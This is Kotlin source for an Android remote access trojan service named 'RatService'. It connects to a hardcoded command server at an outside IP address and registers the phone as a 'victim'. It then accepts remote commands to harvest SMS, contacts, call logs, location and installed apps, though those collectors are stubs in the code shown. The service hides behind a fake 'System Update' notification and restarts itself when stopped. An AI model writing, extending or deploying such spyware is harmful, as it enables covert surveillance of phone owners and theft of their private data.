package com.dooxrat.victim

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class RatService : Service() {

    private var socket: Socket? = null
    private val SERVER_URL = "http://188.166.255.163:5000"
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        deviceId = generateDeviceId()
        createNotificationChannel()
        startForeground(1, createNotification())
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun generateDeviceId(): String {
        return "${Build.MODEL}_${System.currentTimeMillis()}"
    }

    private fun connectToServer() {
        try {
            socket = IO.socket(SERVER_URL)
            
            socket?.on(Socket.EVENT_CONNECT) {
                registerVictim()
            }

            socket?.on("execute_command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }

            socket?.connect()
            
            startHeartbeat()
        } catch (e: URISyntaxException) {
            e.printStackTrace()
        }
    }

    private fun registerVictim() {
        val deviceInfo = JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("androidVersion", Build.VERSION.RELEASE)
            put("sdkVersion", Build.VERSION.SDK_INT)
        }

        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceInfo", deviceInfo)
        }

        socket?.emit("register_victim", data)
    }

    private fun startHeartbeat() {
        val handler = Handler(Looper.getMainLooper())
        handler.post(object : Runnable {
            override fun run() {
                socket?.emit("heartbeat")
                handler.postDelayed(this, 30000)
            }
        })
    }

    private fun handleCommand(data: JSONObject) {
        val command = data.getString("command")
        val params = data.optJSONObject("params")

        when (command) {
            "get_sms" -> getSMS()
            "get_contacts" -> getContacts()
            "get_call_logs" -> getCallLogs()
            "get_location" -> getLocation()
            "get_apps" -> getApps()
            "vibrate" -> vibrate()
        }
    }

    private fun getSMS() {
        // SMS collection logic
        sendResult("get_sms", JSONObject())
    }

    private fun getContacts() {
        // Contacts collection logic
        sendResult("get_contacts", JSONObject())
    }

    private fun getCallLogs() {
        // Call logs collection logic
        sendResult("get_call_logs", JSONObject())
    }

    private fun getLocation() {
        // Location collection logic
        sendResult("get_location", JSONObject())
    }

    private fun getApps() {
        // Apps collection logic
        sendResult("get_apps", JSONObject())
    }

    private fun vibrate() {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(500)
        }
        sendResult("vibrate", JSONObject().put("success", true))
    }

    private fun sendResult(command: String, result: JSONObject) {
        val data = JSONObject().apply {
            put("command", command)
            put("result", result)
        }
        socket?.emit("command_result", data)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rat_service",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        val restartIntent = Intent(this, RatService::class.java)
        startService(restartIntent)
    }
}
